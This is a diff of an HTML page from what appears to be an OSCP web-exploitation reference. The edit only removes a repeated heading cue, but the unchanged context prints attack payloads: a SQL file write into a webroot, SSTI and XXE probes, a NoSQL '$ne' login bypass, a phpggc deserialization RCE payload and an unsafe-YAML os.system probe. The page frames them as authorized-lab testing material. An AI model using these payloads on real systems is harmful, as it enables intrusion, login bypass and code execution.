@@ -128,7 +128,7 @@ SELECT * FROM cmd_output;
 INTO OUTFILE '/CONFIRMED/WEBROOT/check.php';
 </code></pre>
 <p>Requires <code>FILE</code> privilege, a permitted <code>secure_file_priv</code> destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven.</p>
-</details><details data-method-fold><summary><h2 id="out-of-band-sql-injection-boundary">9.3.3.4 Validate a controlled callback when in-band extraction is unavailable <span class="method-label">Out-of-band SQL injection boundary</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</details><details data-method-fold><summary><h2 id="out-of-band-sql-injection-boundary">9.3.3.4 Validate a controlled callback when in-band extraction is unavailable <span class="method-label">Out-of-band SQL injection boundary</span></h2></summary>
 <a id="s-9-3-3-4"></a>
 <p>Out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. A callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction.</p>
 <p>Hypothetical MySQL/Windows UNC lookup in an authorized lab:</p>
@@ -151,7 +151,7 @@ INTO OUTFILE '/CONFIRMED/WEBROOT/check.php';
 <li>verified OS command -> Block 7 session handling;</li>
 <li>file write into web content -> <a href="/oscp/reference/03-initial-access/02-web-file-handling/">web file handling</a>;</li>
 <li>useful application account/role -> remap authenticated behavior in Block 3.</li>
-</ul><details data-method-fold><summary><h2 id="ssti--prove-template-evaluation-then-identify-the-engine">9.3.3.7 Prove server-side template evaluation and identify its engine <span class="method-label">SSTI — prove template evaluation, then identify the engine</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</ul><details data-method-fold><summary><h2 id="ssti--prove-template-evaluation-then-identify-the-engine">9.3.3.7 Prove server-side template evaluation and identify its engine <span class="method-label">SSTI — prove template evaluation, then identify the engine</span></h2></summary>
 <a id="s-9-3-3-7"></a>
 <p>Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload:</p>
 <h3 id="variant-9-3-3-7-1">9.3.3.7.1 Jinja/Twig-style expression probe</h3><pre><code class="language-bash"># Jinja/Twig-style expression probe
@@ -162,7 +162,7 @@ curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH</code></pre>
 curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH
 </code></pre>
 <p>Read: changed, repeatable computed output compared with a literal control supports evaluation. <code>49</code> alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression.</p>
-<p>Sources: <a href="https://portswigger.net/web-security/server-side-template-injection">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="xxe--test-the-xml-parser-and-file-read-result">9.3.3.8 Check whether XML entity processing enables useful file read <span class="method-label">XXE — test the XML parser and file-read result</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://portswigger.net/web-security/server-side-template-injection">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="xxe--test-the-xml-parser-and-file-read-result">9.3.3.8 Check whether XML entity processing enables useful file read <span class="method-label">XXE — test the XML parser and file-read result</span></h2></summary>
 <a id="s-9-3-3-8"></a>
 <p>Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint:</p>
 <pre><code class="language-xml">&#x3C;?xml version="1.0"?>
@@ -179,7 +179,7 @@ curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH
 &#x3C;/value>
 </code></pre>
 <p>A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing.</p>
-<p>Sources: <a href="https://portswigger.net/web-security/xxe">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="nosql-operator-injection--separate-json-objects-from-strings">9.3.3.9 Check whether structured operators alter NoSQL query behavior <span class="method-label">NoSQL operator injection — separate JSON objects from strings</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://portswigger.net/web-security/xxe">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="nosql-operator-injection--separate-json-objects-from-strings">9.3.3.9 Check whether structured operators alter NoSQL query behavior <span class="method-label">NoSQL operator injection — separate JSON objects from strings</span></h2></summary>
 <a id="s-9-3-3-9"></a>
 <p>Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type.</p>
 <h3 id="variant-9-3-3-9-1">9.3.3.9.1 A known username with an operator-valued password</h3><pre><code class="language-bash"># A known username with an operator-valued password
@@ -190,7 +190,7 @@ curl -i -c cookies.txt --data-urlencode 'username=USER' \
   --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN
 </code></pre>
 <p>Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of <code>$</code> operators can rule out this route. Broader <code>$ne</code> username queries may select an unexpected first account; keep the intended identity explicit.</p>
-<p>Sources: <a href="https://portswigger.net/web-security/nosql-injection">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="php-deserialization--match-the-gadget-to-installed-dependencies">9.3.3.10 Check whether unsafe deserialization reaches a usable installed gadget <span class="method-label">PHP deserialization — match the gadget to installed dependencies</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://portswigger.net/web-security/nosql-injection">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="php-deserialization--match-the-gadget-to-installed-dependencies">9.3.3.10 Check whether unsafe deserialization reaches a usable installed gadget <span class="method-label">PHP deserialization — match the gadget to installed dependencies</span></h2></summary>
 <a id="s-9-3-3-10"></a>
 <p>Use when a controlled serialized value reaches unsafe <code>unserialize()</code> and the required classes are loaded. Identify dependencies/builds from source or <code>composer.lock</code> first.</p>
 <h3 id="variant-9-3-3-10-1">9.3.3.10.1 Inspect available families and the exact chain's version/vector requirements</h3><pre><code class="language-bash"># Inspect available families and the exact chain's version/vector requirements
@@ -200,13 +200,13 @@ phpggc -i Monolog/RCE1</code></pre>
 phpggc -b Monolog/RCE1 system id > payload.b64
 </code></pre>
 <p>Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload.</p>
-<p>Sources: <a href="https://github.com/ambionics/phpggc">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="unsafe-yaml-construction--distinguish-loading-from-safe-parsing">9.3.3.11 Check whether YAML loading constructs attacker-controlled objects <span class="method-label">Unsafe YAML construction — distinguish loading from safe parsing</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://github.com/ambionics/phpggc">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="unsafe-yaml-construction--distinguish-loading-from-safe-parsing">9.3.3.11 Check whether YAML loading constructs attacker-controlled objects <span class="method-label">Unsafe YAML construction — distinguish loading from safe parsing</span></h2></summary>
 <a id="s-9-3-3-11"></a>
 <p>Use when source or errors identify Python YAML processing with an unsafe loader and you control the loaded YAML. An ordinary JSON field or <code>yaml.safe_load()</code> does not supply this condition.</p>
 <pre><code class="language-yaml">!!python/object/apply:os.system ["id"]
 </code></pre>
 <p>Put the probe in the actual YAML input/file, preserving its required surrounding structure. Read: attributable command output/effect supports unsafe construction. <code>ConstructorError</code> for the Python tag commonly indicates a loader that does not permit that constructor. Confirm the installed PyYAML version and loader (<code>UnsafeLoader</code>/unsafe load), rather than assuming that any use of YAML permits Python object execution.</p>
-<p>Sources: <a href="https://github.com/yaml/pyyaml">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="sql-truncation-or-normalization-mismatch-at-registration">9.3.3.12 Check whether account normalization crosses an identity boundary <span class="method-label">SQL truncation or normalization mismatch at registration</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://github.com/yaml/pyyaml">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="sql-truncation-or-normalization-mismatch-at-registration">9.3.3.12 Check whether account normalization crosses an identity boundary <span class="method-label">SQL truncation or normalization mismatch at registration</span></h2></summary>
 <a id="s-9-3-3-12"></a>
 <p>Use when the application checks one representation for uniqueness but the DB stores or compares a different one—for example, an overlong username in a fixed-length column. Validate with a disposable account first.</p>
 <pre><code class="language-sql">-- With SQL visibility, inspect the real column and strict-mode behavior
@@ -216,7 +216,7 @@ FROM information_schema.columns
 WHERE table_schema = DATABASE() AND table_name = 'users';
 </code></pre>
 <p>Compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it. A plus character only becomes a space in the appropriate form encoding; it is not a universal SQL payload. A strict length error or a unique constraint on the normalized stored value can stop this path. Confirm an actual account/<a href="/oscp/notes/ad-investigation/glossary/#term-authorization" title="The permission decision for the requested object or operation after identity context is established." class="glossary-term">authorization</a> change before calling it a bypass.</p>
-<p>Sources: <a href="https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash">9.3.3.13 Check a confirmed CGI-to-Bash path for Shellshock command execution <span class="method-label">Shellshock candidate — only for a CGI path that invokes vulnerable Bash</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash">9.3.3.13 Check a confirmed CGI-to-Bash path for Shellshock command execution <span class="method-label">Shellshock candidate — only for a CGI path that invokes vulnerable Bash</span></h2></summary>
 <a id="s-9-3-3-13"></a>
 <p>Use when a confirmed CGI endpoint passes HTTP-derived environment variables into an affected Bash process. An arbitrary PHP/Java route or a Bash version string alone does not establish this chain.</p>
 <pre><code class="language-bash"># Bounded command-effect probe at the actual CGI script
